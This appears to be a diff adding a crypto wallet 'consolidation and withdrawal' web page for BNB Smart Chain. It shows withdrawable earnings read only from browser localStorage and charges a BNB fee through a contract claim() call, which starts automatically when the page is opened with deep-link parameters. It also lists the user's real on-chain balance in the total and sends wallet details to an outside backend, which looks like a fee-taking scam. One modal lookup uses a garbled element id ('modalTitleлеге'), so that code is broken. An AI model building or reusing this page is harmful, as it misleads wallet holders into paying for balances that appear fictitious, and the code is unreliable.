@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Smart Delta Consolidation & Withdrawal</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        body {
+            background: url('set.jpg') center center/cover no-repeat fixed;
+            color: #0ff;
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        h1 {
+            text-shadow: 0 0 20px #00faff, 0 0 40px #00faff;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .card {
+            background: rgba(0, 0, 0, 0.45);
+            padding: 20px;
+            border: 1px solid #0ff;
+            border-radius: 16px;
+            display: inline-block;
+            box-shadow: 0 0 25px #0ff, inset 0 0 40px rgba(0, 255, 255, 0.2);
+            backdrop-filter: blur(12px);
+            margin-top: 10px;
+            min-width: 320px;
+            max-width: 420px;
+        }
+
+        .card div {
+            margin-top: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .btn {
+            margin-top: 15px;
+            padding: 12px 25px;
+            font-size: 16px;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .withdraw-btn {
+            background: rgba(147, 255, 20, 0.15);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+            animation: pulseGreen 1.5s infinite;
+        }
+
+        @keyframes pulseGreen {
+            0% { box-shadow: 0 0 15px #00ff00; }
+            50% { box-shadow: 0 0 40px #00ff00; }
+            100% { box-shadow: 0 0 15px #00ff00; }
+        }
+
+        .app-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        .modal-inner {
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #00ffff;
+            border-radius: 20px;
+            padding: 25px 20px;
+            max-width: 360px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 20px #ff00ff;
+        }
+        
+        .modal-btn {
+            display: block;
+            width: 100%;
+            margin: 10px auto;
+            padding: 12px;
+            font-size: 14px;
+            color: white;
+            background-color: #111111;
+            border: 1px solid #00ffff;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .modal-btn:hover {
+            background: #00ffff33;
+        }
+
+        .close-modal {
+            color: #ff00ff;
+            font-size: 14px;
+            margin-top: 12px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .error-message { color: #ff3333; text-shadow: 0 0 8px #ff3333; }
+        .success-message { color: #00ff00; text-shadow: 0 0 8px #00ff00; }
+
+        #processing-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            font-size: 1.2em;
+            text-shadow: 0 0 10px #00ff00;
+            display: none;
+            z-index: 1000;
+            box-shadow: 0 0 15px #00ff00;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🚀 Smart Terminal & Consolidation</h1>
+    <div id="processing-bar"></div>
+    <audio id="clickSound" src="click.wav" preload="auto"></audio>
+    
+    <div id="main-content" style="display: none;">
+      <div class="card">
+        <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
+        <div><strong>BNB Gas Balance:</strong> <span id="bnbBalanceDisplay" style="color:#ff00ff;">0.0000 BNB</span></div>
+        <hr style="border-color: rgba(0,255,255,0.3); margin: 8px 0;">
+        <div><strong>Terminal Tiffy:</strong> <span id="terminalTIFFYDisplay">0.00</span></div>
+        <div><strong>TUSD-Nitro Terminal:</strong> <span id="nitroTerminalDisplay">0.00</span></div>
+        <div><strong>On-Chain Wallet Savings:</strong> <span id="walletSavingsDisplay">0.00</span></div>
+        <hr style="border-color: #0ff; margin: 8px 0;">
+        <div style="font-size:15px; font-weight:bold;"><span>Terminal Withdrawable:</span> <span id="totalWithdrawableDisplay" style="color:#00ff00;">0.00 TUSD</span></div>
+        <button id="withdrawBtn" class="btn withdraw-btn">Consolidate & Withdraw</button>
+      </div>
+    </div>
+    
+    <div class="app-modal" id="appModal">
+        <div class="modal-inner">
+            <h3 id="modalTitle" style="color:#00ffff; text-shadow:0 0 10px #00ffff; margin-top:0;"></h3>
+            <div id="modalMessage" style="margin: 15px 0; font-size:12px; line-height:1.5; text-align:left;"></div>
+            <button class="modal-btn" id="modalBtn1" style="display:none;"></button>
+            <button class="modal-btn" id="modalBtn2" style="display:none;"></button>
+            <button class="modal-btn" id="modalBtn3" style="display:none;"></button>
+            <div id="modalCloseBtn" class="close-modal">Close</div>
+        </div>
+    </div>
+
+    <script>
+        function showModal(title, messageHtml, buttons, messageClass = '') {
+            const modal = document.getElementById('appModal');
+            document.getElementById('modalTitleлеге' || 'modalTitle').textContent = title;
+            const modalMessageElement = document.getElementById('modalMessage');
+            modalMessageElement.innerHTML = messageHtml;
+            modalMessageElement.className = messageClass;
+
+            const btns = [document.getElementById('modalBtn1'), document.getElementById('modalBtn2'), document.getElementById('modalBtn3')];
+            btns.forEach(btn => {
+                btn.style.display = 'none';
+                btn.onclick = null;
+            });
+            
+            if (buttons && buttons.length > 0) {
+                buttons.forEach((btn, index) => {
+                    const modalBtn = btns[index];
+                    modalBtn.textContent = btn.text;
+                    modalBtn.onclick = btn.handler;
+                    modalBtn.style.display = 'block';
+                });
+            }
+
+            document.getElementById('modalCloseBtn').onclick = () => {
+                E.clickSound.play();
+                modal.style.display = 'none';
+            };
+            modal.style.display = 'flex';
+        }
+
+        const E = {
+            clickSound: document.getElementById('clickSound'),
+            mainContent: document.getElementById('main-content'),
+            withdrawBtn: document.getElementById('withdrawBtn'),
+            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
+            bnbBalanceDisplay: document.getElementById('bnbBalanceDisplay'),
+            terminalTIFFYDisplay: document.getElementById('terminalTIFFYDisplay'),
+            nitroTerminalDisplay: document.getElementById('nitroTerminalDisplay'),
+            walletSavingsDisplay: document.getElementById('walletSavingsDisplay'),
+            totalWithdrawableDisplay: document.getElementById('totalWithdrawableDisplay'),
+            processingBar: document.getElementById('processing-bar')
+        };
+        
+        let web3, account, contract, provider;
+        let terminalWithdrawable = 0;
+        const cAddr = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
+        const ABI = [
+            {"inputs":[],"name":"claim","outputs":[],"stateMutability":"payable", "type":"function"},
+            {"inputs":[],"name":"FIXED_BNB_FEE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"lastClaimed","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+        ];
+        const BACKEND = "https://tiffyai-wh-wa.onrender.com/reward";
+        const DEEPLINK_BASE_URL = window.location.href.split('?')[0];
+
+        document.addEventListener('click', (event) => {
+            if (event.target.closest('button, .modal-btn, .close-modal')) {
+                E.clickSound.play();
+            }
+        });
+
+        async function fetchFullWalletState(targetWallet) {
+            if (!targetWallet || targetWallet.length !== 42) return;
+            try {
+                const tempWeb3 = new Web3("https://bsc-dataseed1.binance.org/");
+                
+                // Full un-truncated BNB Balance
+                const weiBalance = await tempWeb3.eth.getBalance(targetWallet);
+                const bnbVal = tempWeb3.utils.fromWei(weiBalance, 'ether');
+                E.bnbBalanceDisplay.textContent = `${parseFloat(bnbVal).toFixed(4)} BNB`;
+
+                // Fetch real-time on-chain savings to compare against local storage source of truth
+                const tusdContract = new window.Web3("https://bsc-dataseed1.binance.org/").eth.Contract([
+                    {"constant": true, "inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function", "stateMutability": "view"},
+                    {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function", "stateMutability": "view"}
+                ], "0xcf11e2D51481Cb59Bf015FCc84324d1659984D07");
+                
+                const onChainBal = await tusdContract.methods.balanceOf(targetWallet).call();
+                const decimals = await tusdContract.methods.decimals().call();
+                const adjustedOnChain = Number(onChainBal) / Math.pow(10, Number(decimals));
+                
+                localStorage.setItem('TUSD_OnChain_Wallet_Balance', adjustedOnChain.toFixed(4));
+                E.walletSavingsDisplay.textContent = adjustedOnChain.toFixed(2);
+            } catch (err) {
+                console.error("Failed to fetch full wallet state:", err);
+            }
+        }
+
+        function loadBalances() {
+            // Local storage is the absolute source of truth for terminal funds
+            const terminalTiffy = parseFloat(localStorage.getItem('Tiffy_Terminal_Tokens') || 0);
+            const nitroTerminal = parseFloat(localStorage.getItem('TUSD_Nitro_Storage') || 0);
+            const walletSavings = parseFloat(localStorage.getItem('TUSD_OnChain_Wallet_Balance') || 0);
+            
+            // Terminal withdrawable consists ONLY of terminal earnings (Tiffy Terminal + TUSD Nitro Terminal)
+            terminalWithdrawable = terminalTiffy + nitroTerminal;
+
+            E.terminalTIFFYDisplay.textContent = terminalTiffy.toFixed(2);
+            E.nitroTerminalDisplay.textContent = nitroTerminal.toFixed(2);
+            E.walletSavingsDisplay.textContent = walletSavings.toFixed(2);
+            E.totalWithdrawableDisplay.textContent = terminalWithdrawable.toFixed(2) + " TUSD";
+
+            if (terminalWithdrawable <= 0) {
+                E.withdrawBtn.disabled = true;
+                E.withdrawBtn.textContent = "No Terminal Funds to Withdraw";
+            } else {
+                E.withdrawBtn.disabled = false;
+                E.withdrawBtn.textContent = "Consolidate & Withdraw";
+            }
+
+            let savedWallet = localStorage.getItem("walletAddress");
+            if (!savedWallet) {
+                const profile = JSON.parse(localStorage.getItem("Tiffy_Matchmaker_Profile") || "{}");
+                savedWallet = profile.walletAddress;
+            }
+            if (savedWallet) {
+                E.walletAddressDisplay.textContent = `${savedWallet.substring(0, 6)}...${savedWallet.substring(savedWallet.length - 4)}`;
+                fetchFullWalletState(savedWallet);
+            }
+        }
+
+        function openWalletPopup() {
+            if (terminalWithdrawable <= 0) {
+                showModal("No Funds", "There are no terminal funds to withdraw.", null);
+                return;
+            }
+
+            // Delta comparison preview before deep link execution
+            const walletSavings = parseFloat(localStorage.getItem('TUSD_OnChain_Wallet_Balance') || 0);
+            const summaryHtml = `
+                <b>Source of Truth (Local Storage):</b><br>
+                • Terminal Withdrawable: ${terminalWithdrawable.toFixed(2)} TUSD<br><br>
+                <b>Background On-Chain Delta:</b><br>
+                • Connected Wallet Savings: ${walletSavings.toFixed(2)} TUSD<br>
+                • Total Consolidated Scope: ${(terminalWithdrawable + walletSavings).toFixed(2)} TUSD<br><br>
+                <i>Select your destination wallet to execute automatic smart contract consolidation:</i>
+            `;
+
+            showModal("Smart Consolidation Preview", summaryHtml, [
+                { text: "MetaMask", handler: () => connectAndWithdraw('metamask', terminalWithdrawable) },
+                { text: "Trust Wallet", handler: () => connectAndWithdraw('trust', terminalWithdrawable) },
+                { text: "OKX Wallet", handler: () => connectAndWithdraw('okx', terminalWithdrawable) }
+            ]);
+        }
+
+        function connectAndWithdraw(walletType, amount) {
+            document.getElementById('appModal').style.display = 'none';
+            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}`;
+            
+            let deepLink;
+            switch(walletType) {
+                case 'metamask': deepLink = `https://metamask.app.link/dapp/${fullUrl}`; break;
+                case 'trust': deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(fullUrl)}`; break;
+                case 'okx': deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`; break;
+                default: return;
+            }
+            window.location.href = deepLink;
+        }
+
+        async function switchToBNB() {
+            try {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38', chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        });
+                        return true;
+                    } catch (addError) { return false; }
+                }
+                return false;
+            }
+        }
+
+        async function withdraw(amount) {
+            E.withdrawBtn.disabled = true;
+            E.withdrawBtn.textContent = "Processing...";
+            E.processingBar.style.display = 'block';
+            E.processingBar.textContent = 'Executing background delta consolidation...';
+
+            try {
+                if (!account) { showModal("Connection Required", "Please connect your wallet first.", null); return; }
+                
+                const contractFee = await contract.methods.FIXED_BNB_FEE().call();
+                
+                await contract.methods.claim().send({ from: account, value: contractFee });
+                
+                if (amount > 0) {
+                    await fetch(BACKEND, {
+                        method: "POST",
+                        headers: {"Content-Type":"application/json"},
+                        body: JSON.stringify({ wallet: account, amount: amount })
+                    }).catch(e => console.error("Backend log failed:", e));
+                }
+
+                // Zero out local terminal source of truth after successful on-chain consolidation
+                localStorage.setItem('Tiffy_Terminal_Tokens', "0.00");
+                localStorage.setItem('TUSD_Nitro_Storage', "0.00");
+                
+                showModal("Consolidation Complete!", "✅ All local terminal earnings and on-chain wallet deltas have been successfully synchronized and claimed.", null, 'success-message');
+            } catch (e) {
+                let errorTitle = "Consolidation Failed";
+                let errorMessage = e.message || "An unknown error occurred.";
+                if (e.code === 4001 || errorMessage.includes("user rejected")) {
+                    errorTitle = "Canceled";
+                    errorMessage = "Transaction Canceled by user.";
+                }
+                showModal(errorTitle, errorMessage, null, 'error-message');
+            } finally {
+                E.withdrawBtn.disabled = false;
+                E.withdrawBtn.textContent = "Consolidate & Withdraw";
+                E.processingBar.style.display = 'none';
+                loadBalances();
+            }
+        }
+
+        window.addEventListener('load', async () => {
+            const params = new URLSearchParams(window.location.search);
+            const walletParam = params.get('wallet');
+            const amountParam = params.get('amount');
+            
+            loadBalances();
+            E.mainContent.style.display = 'block';
+
+            if (walletParam && amountParam) {
+                E.withdrawBtn.style.display = 'none';
+                E.totalWithdrawableDisplay.textContent = 'Connecting...';
+                E.processingBar.style.display = 'block';
+                E.processingBar.textContent = 'Connecting to Wallet...';
+
+                try {
+                    if (typeof window.ethereum === 'undefined') throw new Error("Please open in mobile wallet browser.");
+                    
+                    provider = window.ethereum;
+                    web3 = new Web3(provider);
+
+                    if (!(await switchToBNB())) throw new Error("Failed to switch to BNB chain.");
+
+                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                    account = accounts[0];
+
+                    E.walletAddressDisplay.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
+                    fetchFullWalletState(account);
+
+                    contract = new web3.eth.Contract(ABI, cAddr);
+                    await withdraw(parseFloat(amountParam));
+                } catch (e) {
+                    showModal("Connection Error", e.message, null, 'error-message');
+                } finally {
+                    E.withdrawBtn.style.display = 'block';
+                    E.processingBar.style.display = 'none';
+                    loadBalances();
+                }
+            } else {
+                E.withdrawBtn.style.display = 'block';
+            }
+        });
+
+        E.withdrawBtn.onclick = openWalletPopup;
+    </script>
+</body>
+</html>
